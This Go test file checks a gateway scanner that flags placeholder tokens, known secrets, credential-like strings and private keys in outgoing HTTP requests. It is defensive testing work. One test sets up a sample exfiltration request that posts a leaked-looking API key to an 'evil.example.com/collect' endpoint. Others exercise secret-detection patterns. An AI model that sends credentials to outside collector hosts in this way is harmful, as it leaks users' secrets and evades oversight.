package scanner

import (
	"bytes"
	"net/http"
	"strings"
	"testing"

	"piso/gateway/internal/patterns"
)

func testPatterns(t *testing.T) *patterns.Compiled {
	t.Helper()
	c, err := patterns.Load("")
	if err != nil {
		t.Fatalf("patterns.Load: %v", err)
	}
	return c
}

func newReq(t *testing.T, method, url, body string, hdr map[string]string) *http.Request {
	t.Helper()
	req, err := http.NewRequest(method, url, bytes.NewReader([]byte(body)))
	if err != nil {
		t.Fatalf("newRequest: %v", err)
	}
	for k, v := range hdr {
		req.Header.Set(k, v)
	}
	return req
}

func TestDetectsPlaceholderInAuthAndBody(t *testing.T) {
	req := newReq(t, "POST", "https://api.openai.com/v1/chat", `{"api_key":"piso_openai_abc123"}`, map[string]string{
		"Authorization": "Bearer piso_anthropic_xyz789",
	})
	res := ScanRequest(req, Options{Patterns: testPatterns(t)})
	if len(res.Placeholders) != 2 {
		t.Fatalf("want 2 placeholders, got %d: %+v", len(res.Placeholders), res.Placeholders)
	}
	if res.LooksCredential() {
		t.Fatalf("placeholders should not look credential: %+v", res)
	}
}

func TestDetectsRealSecretExactMatch(t *testing.T) {
	req := newReq(t, "GET", "https://api.example.com/data", "", map[string]string{
		"X-Api-Key": "sk-SUPER-SECRET-REAL-KEY-123456",
	})
	res := ScanRequest(req, Options{Secrets: []KnownSecret{{ID: "s1", Value: "sk-SUPER-SECRET-REAL-KEY-123456"}}})
	if len(res.RealSecrets) != 1 {
		t.Fatalf("want 1 real secret, got %d: %+v", len(res.RealSecrets), res.RealSecrets)
	}
	if res.RealSecrets[0].SecretID != "s1" {
		t.Fatalf("wrong secret id: %s", res.RealSecrets[0].SecretID)
	}
	// log token must be redacted, never the full value
	if strings.Contains(res.RealSecrets[0].Token, "SUPER-SECRET-REAL") {
		t.Fatalf("token leaked real value: %s", res.RealSecrets[0].Token)
	}
}

func TestDetectsCredentialPatternInBody(t *testing.T) {
	// a leaked-looking OpenAI key in a JSON body — pattern hit, not a known secret
	req := newReq(t, "POST", "https://evil.example.com/collect", `{"text":"sk-proj-leakedtoken1234567890abcdef"}`, nil)
	res := ScanRequest(req, Options{Patterns: testPatterns(t)})
	if len(res.PatternHits) == 0 {
		t.Fatalf("want pattern hit, got none: %+v", res)
	}
	found := false
	for _, f := range res.PatternHits {
		if f.PatternID == "openai-sk-proj" {
			found = true
		}
	}
	if !found {
		t.Fatalf("want openai-sk-proj hit, got: %+v", res.PatternHits)
	}
	if !res.LooksCredential() {
		t.Fatalf("pattern hit must flag LooksCredential")
	}
}

func TestPrivateKeyPattern(t *testing.T) {
	body := "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----\n"
	req := newReq(t, "POST", "https://x.example.com/", body, nil)
	res := ScanRequest(req, Options{Patterns: testPatterns(t)})
	if len(res.PatternHits) == 0 {
		t.Fatalf("want private-key hit")
	}
	for _, f := range res.PatternHits {
		if f.PatternID == "private-key" {
			return
		}
	}
	t.Fatalf("private-key pattern not hit: %+v", res.PatternHits)
}

func TestJSONFieldPathTracking(t *testing.T) {
	req := newReq(t, "POST", "https://api.example.com/", `{"nested":{"token":"piso_test_xx"}}`, map[string]string{"Content-Type": "application/json"})
	res := ScanRequest(req, Options{Patterns: testPatterns(t)})
	if len(res.Placeholders) != 1 {
		t.Fatalf("want 1 placeholder, got %d", len(res.Placeholders))
	}
	if res.Placeholders[0].Location != "json-body" || res.Placeholders[0].Field != "nested.token" {
		t.Fatalf("want json-body/nested.token, got %s/%s", res.Placeholders[0].Location, res.Placeholders[0].Field)
	}
}

func TestEmptyRequestAllowed(t *testing.T) {
	req := newReq(t, "GET", "https://registry.npmjs.org/pkg", "", nil)
	res := ScanRequest(req, Options{Patterns: testPatterns(t)})
	if res.HasPlaceholder() || res.LooksCredential() {
		t.Fatalf("clean request flagged: %+v", res)
	}
}